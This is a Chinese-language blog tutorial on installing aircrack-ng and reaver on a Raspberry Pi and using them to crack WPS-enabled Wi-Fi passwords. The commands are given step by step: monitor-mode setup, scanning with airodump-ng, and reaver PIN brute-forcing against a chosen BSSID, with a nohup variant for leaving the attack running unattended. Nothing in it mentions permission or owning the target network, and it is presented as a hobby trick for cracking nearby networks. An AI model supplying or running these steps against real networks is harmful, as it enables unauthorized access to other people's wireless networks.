# 树莓派（raspberrypi）安装aircrack-ng,reaver及wifi破解教程

这篇文章主要应百度贴吧水友的要求，特写了一个小教程。让pi变得更有意思。
这个无线破解和PC上的原理是一样的，只不过平台换到了PI上。PI主要就是省电，放在那里跑一个月也没事。

回到正题：

### 硬件环境

 - 树莓派B+一个（我用的是debian环境）
 - PC一台（或其它设备直接操作PI就行）
 - 无线网卡（能用就行，不过强大的无线网卡会事半功倍，我用的3070）


### 安装依赖包
```
sudo apt-get install -y libpcap-dev libsqlite3-dev sqlite3 libpcap0.8-dev libssl-dev build-essential iw tshark subversion
sudo apt-get install libnl-3-200 libnl-3-dev libnl-3-doc libnl-genl-3-dev libnl-genl-3-200
```

### 安装aircarck-ng
```
svn co http://svn.aircrack-ng.org/trunk/ aircrack-ng
cd aircrack-ng/
make
sudo make install
```

### 安装reaver
```
wget http://reaver-wps.googlecode.com/files/reaver-1.4.tar.gz
tar zxvf reaver-1.4.tar.gz
cd reaver-1.4/src
./configure
make
sudo make install
```

如果安装成功后，会有`airmon-ng,airodump-ng,reaver`等命令可用。

### 破解教程
```
sudo airmon-ng start wlan0
sudo airodump-ng mon0
```
![1](/uploads/2014/11/1.png)

```
sudo airodump-ng mon0
```
![2](/uploads/2014/11/2.png)

根据上面的airodump搜索到的无线信号，然后可以挑信号强的进行破解（注意，要选择开了WPS功能的）
```
sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 
```
![2-2](/uploads/2014/11/2-2.png)

如果想挂机破解，记得加上`nohup`命令后，可以断开ssh。然后剩下就是等待。
```
nohup sudo reaver -i mon0 -b 00:00:00:00:00:00 -a -S -vv -d2 -t 5 -c 11 -o fbi &
```
如果破解成功后，打开输出的日志，就可以看到reaver出来的密码。

![3](/uploads/2014/11/3.png)
